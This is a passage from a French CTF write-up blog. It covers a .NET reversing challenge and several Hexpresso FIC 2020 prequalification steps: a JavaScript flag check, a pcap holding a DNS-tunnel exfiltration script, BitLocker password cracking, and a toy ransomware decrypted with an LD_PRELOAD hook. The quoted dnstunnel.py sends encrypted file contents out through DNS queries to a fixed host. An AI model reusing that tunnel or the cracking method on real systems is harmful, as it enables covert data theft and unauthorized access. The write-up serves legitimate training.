dans la partie précédente, la main va seek sur le pattern et récupérer les octets jusque la fin du binaire. Mais ce n’est pas tout, ce blob va etre chiffré et déchiffré avec une clé. La clé est en réalité les opcode de la fonction “InitialCheck”, représenté par le premier encadré rouge. Afin de récupérer les opcodes de la fonction qui nous intéresse, il est possible d’utiliser un désassembleur. La fonction “initialCheck” est donc appelée et commence par “00 28 10 00 …” et termine par “… 00 2A”. Dans la vu “hex” de IDA, il est possible de voir tous les opcodes de cette fonctions: Finalement il ne reste qu’à les extraires et faire un peu de mise en forme. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:8:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Unpack Comme vu dans le challenge précédent, la compatibilité entre C# et Python sont un peu compliquées. C’est pourquoi un interpréteur en ligne a été utilisé pour récupérer les octets déchiffré. La variable “ila” est le regroupement de tout les opcode de la méthode “InitialCheck”: using System; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; public class Example { public static void Main() { var ila = new byte[] {0, 40, 16, 0, 0, 6, 0, 40, 47, 0, 0, 10, 12, 8, 44, 20, 0, 114, 195, 0, 0, 112, 40, 48, 0, 0, 10, 0, 21, 40, 49, 0, 0, 10, 0, 0, 23, 10, 40, 50, 0, 0, 10, 111, 51, 0, 0, 10, 18, 0, 40, 8, 0, 0, 6, 38, 6, 13, 9, 44, 20, 0, 114, 195, 0, 0, 112, 40, 48, 0, 0, 10, 0, 21, 40, 49, 0, 0, 10, 0, 0, 40, 9, 0, 0, 6, 19, 4, 17, 4, 44, 20, 0, 114, 195, 0, 0, 112, 40, 48, 0, 0, 10, 0, 21, 40, 49, 0, 0, 10, 0, 0, 2, 142, 22, 254, 1, 19, 5, 17, 5, 44, 20, 0, 114, 205, 0, 0, 112, 40, 48, 0, 0, 10, 0, 21, 40, 49, 0, 0, 10, 0, 0, 2, 22, 154, 114, 17, 1, 0, 112, 40, 19, 0, 0, 6, 40, 52, 0, 0, 10, 19, 6, 17, 6, 44, 22, 0, 114, 195, 0, 0, 112, 40, 48, 0, 0, 10, 0, 21, 40, 49, 0, 0, 10, 0, 0, 43, 16, 0, 114, 107, 1, 0, 112, 2, 22, 154, 40, 53, 0, 0, 10, 0, 0, 114, 227, 1, 0, 112, 40, 10, 0, 0, 6, 11, 7, 126, 54, 0, 0, 10, 40, 55, 0, 0, 10, 19, 7, 17, 7, 44, 55, 0, 7, 114, 253, 1, 0, 112, 40, 11, 0, 0, 6, 19, 8, 17, 8, 40, 56, 0, 0, 10, 32, 233, 0, 0, 0, 254, 1, 19, 9, 17, 9, 44, 20, 0, 114, 51, 2, 0, 112, 40, 48, 0, 0, 10, 0, 21, 40, 49, 0, 0, 10, 0, 0, 0, 42}; var data = new byte[] {70, 160, 21, 204, 114, 153, 76, 162, 167, 177, 156, 18, 65, 24, 50, 27, 11, 236, 29, 225, 39, 98, 103, 98, 175, 132, 213, 175, 17, 14, 41, 12, 87, 210, 237, 231, 171, 48, 116, 237, 209, 59, 191, 170, 240, 127, 36, 170, 251, 159, 194, 199, 148, 115, 56, 90, 43, 248, 83, 170, 134, 7, 122, 31, 216, 120, 243, 147, 19, 40, 245, 230, 67, 171, 47, 39, 33, 246, 147, 205, 15, 129, 187, 210, 143, 72, 29, 226, 207, 218, 116, 50, 179, 4, 50, 184, 40, 128, 63, 58, 101, 231, 251, 42, 85, 253, 28, 28, 130, 224, 211, 186, 39, 170, 233, 223, 56, 213, 53, 222, 110, 251, 6, 159, 197, 204, 142, 216, 165, 93, 6, 143, 191, 44, 194, 230, 70, 134, 144, 88, 220, 157, 244, 209, 211, 238, 189, 52, 213, 186, 117, 192, 111, 28, 172, 96, 210, 200, 252, 171, 145, 20, 236, 109, 180, 99, 196, 220, 21, 119, 177, 229, 163, 116, 21, 170, 47, 210, 233, 136, 159, 149, 31, 102, 40, 60, 53, 74, 107, 33, 251, 92, 227, 77, 212, 215, 207, 45, 66, 35, 234, 194, 222, 180, 147, 251, 165, 166, 34, 108, 219, 147, 238, 105, 72, 222, 224, 24, 88, 69, 70, 226, 38, 52, 109, 56, 156, 67, 23, 246, 56, 24, 133, 219, 160, 183, 9, 171, 125, 104, 63, 204, 160, 163, 157, 90, 27, 251, 77, 127, 110, 20, 99, 48, 154, 28, 131, 187, 27, 166, 91, 82, 113, 16, 116, 251, 22, 98, 141, 3, 116, 53, 239, 47, 57, 58, 170, 170, 252, 23, 23, 64, 97, 241, 171, 61, 64, 111, 22, 197, 0, 59, 20, 255, 65, 127, 121, 90, 64, 119, 121, 128, 30, 115, 239, 155, 120, 112, 207, 85, 188, 158, 230, 232, 198, 170, 227, 153, 99, 247, 87, 30, 193, 182, 223, 36, 42, 173, 227, 8, 121, 107, 240, 214, 193, 152, 85, 94, 152, 192, 203, 99, 33, 196, 199, 36, 154, 131, 28, 53, 248, 42, 113, 43, 235, 54, 30, 57, 135, 75, 125, 138, 34, 33, 204, 141, 151, 151, 200, 106, 116, 57, 68, 68, 132, 29, 234, 172, 141, 1, 39, 199, 45, 254, 138, 160, 34, 68, 100, 152, 17, 63, 83, 18, 193, 54, 202, 95, 52, 76, 49, 93, 20, 229, 170, 122, 88, 181, 139, 156, 251, 77, 114, 115, 42, 110, 14, 124, 157, 2, 248, 219, 192, 97, 75, 0, 152, 173, 237, 99, 67, 168, 120, 163, 7, 129, 101, 201, 140, 190, 39, 195, 166, 252, 148, 125, 21, 218, 37, 75, 254, 215, 129, 207, 103, 218, 187, 125, 62, 144, 255, 201, 121, 49, 18, 117, 26, 97, 212, 180, 142, 77, 31, 58, 66, 101, 120, 77, 163, 232, 100, 179, 194, 108, 61, 115, 38, 44, 103, 194, 105, 216, 194, 54, 66, 178, 75, 155, 108, 100, 177, 181, 116, 80, 8, 25, 200, 210, 64, 171, 86, 214, 98, 114, 117, 27, 194, 231, 50, 42, 180, ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:9:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Analyse du second binaire Le fichier “output.blob” est donc un binaire: Un second fichier .Net. En lui faisant un rapide tour dans DnSpy, le reverse de la fonction n’est pas très complexe: Finalement il ne s’agit que de la concaténation. Le MD5 du milieu est rapide à casser avec des bases de données en ligne, il signifie du MD5 de “dynamic”. Le flag peut donc être reconstitué. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:10:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Flag CSCG{n0w_u_know_st4t1c_and_dynamic_dotNet_R3333} ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:11:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Le CTF “CaptureTheFic” est organisé par l’équipe de CTF “Hexpresso”. Equipe connue pour ses différents résultats en CTF et pour l’organisation de CTF, tel que le BreizhCTF. CaptureTheFic se déroule en deux étapes: Une étape de pré-qualifications en ligne avec énormément d’équipes; Une phase finale au FIC, composée des 14 meilleures équipes issues des pré-qualifications. Comme ce writeup le montrera, ce CTF n’est pas un jeopardy standard. Cette préqualification comporte 8 étapes et il est nécessaire de terminer une épreuve pour accéder à la suivante. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:0:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"I. Step 1 - Reverse JS Event Challenge Category Solves CatureTheFic Step 1 Web 674 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:1:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"I.1. Etat de l’art On commence ce premier challenge avec une page web qui nous propose de soumettre un flag. Si le flag n’est pas correct, la page nous répond “NOPE” avec une pop-up. Pour trouver la bonne entrée, nous essayons de voir si la vérification du flag ne se fait pas côté client. Pour cela, on affiche les sources de la page. Après avoir affiché les sources de la page, on remarque un script JavaScript. La vérification du flag se fait bien côté client. Il faut maintenant comprendre comment marche ce script. Le script effectue tout simplement une opération arithmétique entre deux chaînes de caractères qui sont notre flag et une constante “u_u” qui vaut “CTF.By.HexpressoCTF.By.Hexpresso”. Pour chaque caractère présent dans la chaîne “u_u”, le script va prendre le code UTF-16 du caractère n de la chaîne “u_u”, l’additionner avec le code UTF-16 du caractère n du flag rentré par l’utilisateur puis ajouter 42 x n. Il va ensuite comparer ce nombre à l’élément n du tableau game comme montré dans les lignes de code ci-dessous: for (i = 0; i \u003c u_u.length; i++) { if (u_u.charCodeAt(i) + flag.charCodeAt(i) + i * 42 != game[i]) { alert(\"NOPE\"); return; } } ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:1:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"I.2. Algorithme de rétroingénierie du script JS Pour résoudre ce challenge, il suffit de calculer flag qui est égal à flag = char(game[i] - i * 42 - u_u.charCodeAt(i)); Pour cela on implémente un script python qui est le suivant pour résoudre ce challenge: game = [ 116, 228, 203, 270, 334, 382, 354, 417, 485, 548, 586, 673, 658, 761, 801, 797, 788, 850, 879, 894, 959, 1059, 1071, 1140, 1207, 1226, 1258, 1305, 1376, 1385, 1431, 1515 ] u_u = \"CTF.By.HexpressoCTF.By.Hexpresso\"; #flag = document.getElementById(\"flag\").value; for i in range(len(u_u)): print(\"%s\" % chr((ord(u_u[i]) - game[i] + i*42 )*-1), end = '') 1f1bd383026a5db8145258efb869c48f Une fois le bon flag soumis, on arrive directement à l’étape 2. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:1:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"II. Step 2 - Old EXFIL but Gold https://ctf.hexpresso.fr/1f1bd383026a5db8145258efb869c48f Event Challenge Category Solves CatureTheFic Step 2 Forensic / Crypto 531 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:2:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"II.1. Etat de l’art Cette deuxième épreuve nous laisse avec un fichier pcap. On remarque différents types de flux dont beaucoup de paquets utilisant le protocole DNS. Après avoir suivi le HTTP Stream sur Wireshark de certains paquets, on remarque que l’utilisateur a voulu implémenté un tunnel DNS en python (dnstunnel.py) avec un algorithme de chiffrement maison laissant à désirer. #!/usr/bin/python3 # I have no idea of what I'm doing #Because why not! import random import os f = open('data.txt','rb') data = f.read() f.close() print(\"[+] Sending %d bytes of data\" % len(data)) #This is propa codaz print(\"[+] Cut in pieces ... \") def encrypt(l): #High quality cryptographer! key = random.randint(13,254) output = hex(key)[2:].zfill(2) for i in range(len(l)): aes = ord(l[i]) ^ key #my computer teacher hates me output += hex(aes)[2:].zfill(2) return output def udp_secure_tunneling(my_secure_data): #Gee, I'm so bad at coding #if 0: mycmd = \"host -t A %s.local.tux 172.16.42.222\" % my_secure_data os.system(mycmd) #We loose packet sometimes? os.system(\"sleep 1\") #end if def send_data(s): #because I love globals global n n = n+1 length = random.randint(4,11) # If we send more bytes we can recover if we loose some packets? redundancy = random.randint(2,16) chunk = data[s:s+length+redundancy].decode(\"utf-8\") chunk = \"%04d%s\"%(s,chunk) print(\"%04d packet --\u003e %s.local.tux\" % (n,chunk)) blob = encrypt(chunk) udp_secure_tunneling(blob) return s + length cursor = 0 n=0 while cursor\u003clen(data): cursor = send_data(cursor) #Is it ok? On importe en local ce script pour comprendre son fonctionnement. La méthode de chiffrement est un simple XOR: aes = ord(l[i]) ^ key On remarque aussi que la clef est transmise en claire avec les données chiffrées dans la fonction “encrypt” grâce à la ligne suivante: output = hex(key)[2:].zfill(2) Cette clef est le premier octet envoyé lors d’une communication en utilisant ce tunnel DNS maison. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:2:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"II.2. Fonction de déchiffrement Il nous suffit maintenant de créer un script qui va prendre le premier octet de données comme clef et qui va nous permettre de déchiffrer le contenu du tunnel DNS comme ci-dessous: f = open(\"dns.txt\", \"r\") index_str = \"\" index = 0 length = 0 for x in f: key = int(x[0:2], 16) pos = length + index index_str = \"\" for i in range(2, 10, 2): index_str += chr(int(x[i:i+2], 16) ^ key) index = int(index_str) text = \"\" for i in range(10 + 2*(pos-index) , len(x)-1, 2): text += chr(int(x[i:i+2], 16) ^ key) length = len(text) +pos - index print(text, end='') print(\"\\n\") ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:2:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"II.3. Extraction des sous domaines Une fois cette fonction réalisée, il nous fait extraire tous les sous domaines présents dans le pcap contenant les données chiffrées. Pour cela on va utiliser l’outil tshark en lui donnant les filtres adéquates. tshark -r cb52ae4d15503c598f0bb42b8af1ce51.pcap -Y ‘dns.qry.name \u0026\u0026 ip.src == 172.16.42.99’ -Tfields -e “dns.qry.name” |sed ’s/.local.tux//g’ Cette commande va nous permettre d’extraire les informations utiles pour la résolution de cette étape: 0000 : a191919191e2cecfc6d3c0d5d4cdc0d5c8cecfd2808081f8 0001 : a696969797cfc9c8d5878786ffc9d386c2cfc286cfd286d5c986c0 0002 : 88b8b8bab8fda8ece1eca8e1fca8fbe7a8eee9faa98282c0edfaeda8e1fba8 0003 : 1929292a2976397f786b381313517c6b7c39706a396d 0004 : cafafaf9f3afb8afeaa3b9eabea2afeaa6a3a4a1ea 0005 : edddddd9d4cd81848386cd8483cd8f8c9e 0006 : 6b5b5b5e520a180e58594b0d0419 0007 : 4f7f7f797b6f29203d227545010d7d07067b0b1b070617 0008 : ae9e9e999fe0ec9ce6e79aeafae6e7f6fd98f79dfbe3f7f6e9ff 0009 : 9cacacababd8c8d4d5c4cfaac5afc9d1c5c4dbcdc6d0c5 0010 : 6c5c5c545d343f5a355f392135342b3d362035 0011 : 6f5f5f575a5c3a223637283e352336 0012 : e4d4d4ddd6bea8bdaba6bea3 0013 : d7e7e7eee08d909ce3e48399e38f909ae3 0014 : 73434243403d472b343e47212334264027203c37373e3641373c 0015 : daeaebebe88fe98e89959e9e979fe89e95809e989794898e9183 0016 : 4272737070060d1806000f0c1116091b18140f177105 0017 : 36060704017b7865627d6f6c607b6305717f7b6c60717f02623c7b797c 0018 : 9cacadafabafdbd5d1c6cadbd5a8c896d1d3d6cdd1 0019 : 54646560650e02131d60005e191b1e051919601019190e0013606605016969 0020 : 25151410176868116168687f716211177470181818 0021 : f7c7c6c2cea3b0c3c5a6a2cacacafdfdd7a8d7d7d7d7 0022 : 7b4b4a4d482a2e46464671715b245b5b5b5b5b5b 0023 : 95a5a4a3ad9f9fb5cab5b5b5b5b5b5b5b5b5b5b5b5b5 0024 : d8e8e9efe1f8f8f8f8f8f8f8f8 0025 : d6e6e7eee5f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6 0026 : 0f3f3e37362f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f 0027 : eededfd7d8cecececececececececece 0028 : 56666466637676767676767676767676765c2a 0029 : 7d4d4f4c4e5d5d5d5d77015d0122225d5d5d22 0030 : 94a4a6a6a0b4b4cbcbcbcbcbb4b4cbcbcbb4cb 0031 : 7c4c4e4e442323235c5c2323235c23235c 0032 : b585878680ea95eaea9595ea95eaea 0033 : facac8cec9a5a5daa5a5a5dadaa5a5a5daa5a5a5dadaa5 0034 : 10202225234f304f4f4f30304f4f4f 0035 : daeae8eceb8585fafad0a6 0036 : 75454743407f0955522a5529555a552a55295529 0037 : 6656545155494639463a463a494649464139463a1a464139 0038 : 4e7e7c767d6e69116e12326e691111616e 0039 : 5f6f6d6767237f780000707f007f03707f0000707f0000 0040 : eddddfd4d5c2cdb2b2c2cdb2b291c2 0041 : e7d7d4d7d4c7b8b89bc8c7b8c7bbc7ed9bc79bc79bc79bc7c7b8b8c8 0042 : 88b8bbb9b8a8d4a882f4a8f4a8f4a8f4a8a8d7d7a7b6a8a8b4f4a8f4 0043 : 83b3b0b1b3ffa3a3dcdcacbda3a3bfffa3ff 0044 : 48787b7a70687434683417616834683468346868 0045 : cdfdfefefe92e4edb1edb1edb1eded9292e2919292ed9192 0046 : eededddadcceb1b1c1b2b1b1ceb2b1b1ceb2cec6b1c7ce92e492b192ce 0047 : b38380868093ef939bec9a93cfb9cfeccf93cfeccfef 0048 : c2f2f1f4f0be9dbee2be9dbe9e9d9d9ded9ded9e9d9ee2ec9d 0049 : 28181b1f197777077707747774080677770754775408087477777754547777 0050 : 80b0b3b8b2dfaffcdffca0a0dcdfdfdffcfcdfdfdfaf 0051 : 3b0b0803026764646447476464641464 0052 : 93a3a0aaa4ccbcccccccbccfccccccbcb399b3b3b3b3b3b3 0053 : 41717571701e6e1d1e1e1e6e614b6161616161616161616161 0054 : 28181c18112208080808080808 0055 : ddede9eceefdfdfdfdfdfdfdfdfdfdfdfdfda1 0056 : d3e3e7e1e7f3f3af8caff3f3f3f3f3f3f3f3f3f3 0057 : 97a7a3a4a6b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7 0058 : f2c2c6c1c7d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2 0059 : 340400000714141414141414141414141414143e3e3e 0060 : 9fafababa8bfbfbfbfbfbfbfbfbfbf959595 0061 : 6555515056454545456f6f6f 0062 : 84b4b0b1bd8e ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:2:3","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"II.4. Flag Une fois l’extraction faite, il nous suffit de déchiffrer la sortie de la commande tshark grâce à la fonction de déchiffrement mise en place en II.2: Congratulations!! You did it so far! Here is the link in base32 form: NB2HI4DTHIXS6Y3UMYXGQZLYSODDME2DOZDBMNSTKYZVMU3GIMZVGI4T MOJQMM4DMMZTG42QU=== _ | |__ _____ ___ __ _ __ ___ ___ ___ ___ | '_ \\ / _ \\ / / '_ | '/ _ / / |/ _ \\ | | | | /\u003e \u003c| | \\ () | || |_|_/_/_\\ ./|_| _||___/_/_/ Le lien décodé nous donne accès à l’étape 3: https://ctf.hexpresso.fr/5798ca47dace5c5e6d3529690c863375 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:2:4","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"III. Step 3 - Do your Forensic ANALyst job Event Challenge Category Solves CatureTheFic Step 3 Forensic 347 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:3:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"III.1. Etat de l’art Le fichier utilisé pour cette épreuve est un dump de disque: La première chose à faire de voir les différentes partitions disponibles dans ce fichier: On voit différentes partitions, dont une partition NTFS qui peut nous intéresser à l’offset 512*128, soit la taille d’un secteur multiplié par l’offset de début de la partition. Sur la première image, il est possible de voir des erreurs dans l’output de la commande “file”. Il s’agit peut-être d’une partition endommagée ou chiffrée… Pour en être sûr, regardons les premiers octets de la partition NTFS: L’en-tête “-FVE-FS-” signifie que nous sommes en présence d’un volume bitlocker. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:3:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"III.2. Trouver la clé Pour déchiffrer un volume bitlocker, il existe plusieurs façons: Connaitre le mot de passe de l’utilisateur Récupérer la clé dans un dump mémoire Avoir la clé de récupération bitlocker Dans notre cas, c’est forcément avec le mot de passe utilisateur. Ne le connaissant pas, il reste 2 possibilitées: Bruteforcer le mot de passe Deviner le mot de passe Etant un bourrin dans l’âme, cet article m’a aidé: https://medium.com/adamantsec/write-up-of-bsideslisbon-ctf-df479bff8b7d Connaissant un peu Hexpresso, je me suis dis que ça ne serait pas du guessing avec un quelque chose d’exotique, donc j’ai tenté de lancer un rockyou: Le mot de passe bitlocker est donc: password. Il ne reste qu’à monter le volume: ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:3:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"III.3. Récupérer les fichiers supprimés En déchiffrant le volume bitlocker avec dislocker, puis en montant le volume déchiffré, on se rend rapidement compte qu’il n’y a pas de flag, mais seulement un petit message de la part de l’auteur du challenge. Dans ma méthodologie d’analyse, la première chose à faire avec un dump de disque est d’inspecter le disque avec testdisk, à la recherche de fichiers supprimés. $ testdisk dislocker-file Proceed \u003e None \u003e Advanced \u003e Undelete Le fichier fic.zip présage plein de bonnes choses. Un coup de “c c” et “q q q q” dans testdisk, et voilà le zip récupéré. Finalement, l’archive zip nous renvoie vers un gist: https://gist.github.com/bosal43833/3e815abc3f92e45963a8aafc8acfe411 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:3:3","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"III.4. Flag $ echo -n 'aHR0cHM6Ly9jdGYuaGV4cHJlc3NvLmZyLzFlYTk2N2Y1MmQxYWFiMzI3ZDA4NGVmZDI0ZDA0OTU3Cg==' |base64 -d https://ctf.hexpresso.fr/1ea967f52d1aab327d084efd24d04957 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:3:4","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"IV. Step 4 - Wannacry is f*cking back Event Challenge Category Solves CatureTheFic Step 4 Reverse / Crypto 244 ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:4:0","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"IV.1. Etat de l’art Le malware est disponible à l’adresse suivante : https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip Cette épreuve commence donc avec deux fichiers : $ wget https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip $ unzip 5c09555ef0576e6cee46a9ee7a841c8b.zip Archive: 5c09555ef0576e6cee46a9ee7a841c8b.zip extracting: flag.txt.crypt inflating: wannafic $ file * 5c09555ef0576e6cee46a9ee7a841c8b.zip: Zip archive data, at least v1.0 to extract flag.txt.crypt: data wannafic: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=97354f92f87502594330507adef22eca2765dd76, for GNU/Linux 3.2.0, stripped ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:4:1","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"IV.2. Analyse du binaire En plaçant le binaire “wannafic” dans Ghidra, on remarque très rapidement qu’il y a que très peu de code dans le main: Tout le traitement se fait dans la fonction “payload_fn”: Dans la fonction “payload_fn”, les deux lignes encadrées sont importantes: Orange: Récupération du timestamp actuel au format epoch ; Rouge: Une fonction prenant comme paramètre le contenu du fichier et le timestamp. Dans la fonction “crypt_fn”, on voit le srand se basant sur le timestamp format epoch (encadré rouge), mais aussi l’algo permettant de chiffrer le fichier en entrée. La boucle va générer un keystream se basant sur le timestamp et va xorer caractère par caractère: input_file[rand_output % size_input_file] ^ (_char_n ^ rand_output) L’opération étant réversible, il est possible de déchiffrer le fichier en prenant son timestamp comme base pour générer le keystream. ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:4:2","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"IV.3. Déchiffrement du fichier Pour tenter l’hypothèse évoquée ci-dessus, il faut récupérer le timestamp de “flag.txt.crypt”: $ stat -c %Y flag.txt.crypt 1576154262 L’argument “%Y” donne le timestamp de la dernière modification du fichier depuis epoch. Pour hooker la fonction time du binaire et forcer le retour à ce timestamp précis, il existe la technique du “LD_PRELOAD”. Le but est de créer une fonction du même nom, time en l’occurence, pour forcer une action précise. Dans notre cas, l’action bien précise est de forcer le retour de la fonction time du binaire avec le timestamp du fichier chiffré. #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003ctime.h\u003e time_t time(time_t *t) { return 1576154262; } Avant le lancement du binaire, on renomme le fichier chiffré en flag.txt: L’output ne ressemble pas à grand chose, mais ce qui est affiché est bien plus petit que le fichier chiffré. Le caractère \\xff a l’air de péter l’output. Les caractères \\x0a, \\x0d et \\x00 risquent de péter l’output également. Une technique “c’est moche mais ça marche”, serait de patcher le fichier chiffrer en remplaçant ces badchars par un caractère imprimable, comme A par exemple. Le déchiffrement à ces caractères ne fonctionneraient pas, mais avec un peu de chance on pourra quand même récupérer le hash pour passer à la suite. \u003e\u003e\u003e enc_dat = open('flag.txt','rb').read() \u003e\u003e\u003e enc_dat = enc_dat.replace('\\xff','A').replace('\\x0a','A').replace('\\x0d','A').replace('\\x00','A') \u003e\u003e\u003e open('flag.txt','w').write(enc_dat) ","date":"2020-01-21","objectID":"maki.bzh/writeups/hexpressofix2020/:4:3","tags":["hexpresso","fic","forensic","pentest","cryptography","reverse","pyjail"],"title":"[FIC 2020] - Hexpresso CTF Prequals","uri":"maki.bzh/writeups/hexpressofix2020/"},{"categories":["Writeups"],"content":"IV.4. Flag $ gcc time.c -o time -shared -fPIC; LD_PRELOAD=\"${PWD}/time\" ./wannafic flag.txt; cat flag.txt.crypt ██░ ██ ▓█████ ▒█ █\\▒ ██▓█\\█ ██▀███ ▓█████ █████ ██████ ▒█████ █ █░ ▄▄▄ ██████ █░ ██ ▓█████ ██▀██ ▓█████ ██░ ██▒▓█ ▀ ▒▒ █ █ ▒░▓██░ ██▒▓██ ג ██▒▓█ ▀ ▒██ ▒ ▒██ ▒ ▒██▒ ██▒ ▓░ █ ░█░▒████▄ ▒██ ▒ ▓██░ ██▒▓█ ▀ ▓██ ▒ ██▒▓█ ▀ ▒█▀▀██░▒███ ░░ █ ░▓██░ ██▓▒▓██ ░▄█ ▒▒███ ░ ▓██▄ ░ ▓██▄ ▒██░ ██▒ ▒█░ █ ░█ ▒██ ▀█▄ ░ ▓██▄ ▒██▀▀██░▒███ ██ ▄█ ▒▒███ ░▓█ ░██ ▒▓█ ▄ / █ █ ▒ ▒██▄█▓▒ ▒▒██▀▀█▄ ▒▓█ ▄ ▒ ██ ▒ ██▒▒██ ██░ ░█░ █ ░█ ░██▄▄▄▄██l ▒ ██▒ ░▓█ ░██ ▒▓█ ▄ ██▀▀█▄ ▒▓█ ▄ ░▓█▒░██▓░▒███▒▒██▒ ▒██▒▒██▒ ░ ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░ ████▓▒░ ░░██▒██ ▓█ ▓█▒▒████▒▒ ░▓█▒░██▓░▒███▒░██▓ ▒██▒░▒███\\▒ ▒ ░░▒░▒░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░ ░░ ▒▓ ░▒▓░░░ ▒( ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ░░ ▒░▒░▒░ ░▓░▒ ▒ ▒▒ ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░ 